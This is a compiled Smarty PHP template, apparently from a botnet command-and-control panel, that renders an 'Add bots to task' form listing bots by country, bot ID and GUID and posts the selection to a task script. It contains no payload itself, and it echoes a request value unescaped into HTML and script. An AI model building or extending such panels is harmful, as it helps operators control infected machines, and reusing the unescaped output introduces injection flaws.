<?php /* Smarty version Smarty-3.0.6, created on 2011-03-26 04:18:20
         compiled from "Z:/home/gate/www/client/templates\add_bots.tpl" */ ?>
<?php /*%%SmartyHeaderCode:233524d8d3edc0e2604-24798397%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    '1485b62329511a8907f75f5b9329cf2732adf14d' => 
    array (
      0 => 'Z:/home/gate/www/client/templates\\add_bots.tpl',
      1 => 1298564716,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '233524d8d3edc0e2604-24798397',
  'function' => 
  array (
  ),
  'has_nocache_code' => false,
)); /*/%%SmartyHeaderCode%%*/?>
<?php if (isset($_smarty_tpl->getVariable('TASK',null,true,false)->value)){?>
<h1>Add bots to task #<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
</h1>
<br>
<a id='lnk_add_bots' href='javascript:void();'>Select favorite bots</a><br><br>
<form id='frm_addbots'>
<table style="border: 1px solid lightgray; font-size: 9px; border-collapse: collapse; background-color: rgb(255, 255, 240); width:700px;" border="1" cellpadding="3" cellspacing="0" id='bots_table'>
<th style='width:30px;'>#</th><th style='width:40px;'>Country</th><th style='width:40px;'>BOT ID</th><th>GUID</th><th style='width:20px;'></th>

<tr><td colspan='5' align='center'><b>There are no selected bots! Using all bots!</b></td></tr>
</table>
<input type='hidden' value='<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
' name='task'>
<hr color="#dddddd" size="1">
<center><input type='submit' value='Save'></center>
</form>
<?php }?>


<script>
$('#lnk_add_bots').click(function() { LoadPopup('./mod/get_bots.php?task=<?php echo $_smarty_tpl->getVariable('TASK')->value;?>
', 'Add bots to task', 700); });


$("#frm_addbots").submit(function() 
{
	pdata = $('#frm_addbots').serialize(true);
    $.post('./mod/task_addbots.php', pdata, function(data) { $("#page_content").html(data); });
    return false;
});
$('#lnk_add_bots').click();
</script>
